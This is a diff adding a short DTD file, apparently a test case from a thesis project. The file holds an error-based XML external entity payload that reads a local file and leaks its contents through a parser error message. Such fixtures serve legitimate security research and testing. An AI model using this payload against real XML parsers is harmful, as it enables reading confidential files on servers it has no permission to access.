@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file://C:\Users\jostr\Desktop\thesis\testcases\build\server_files\test.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
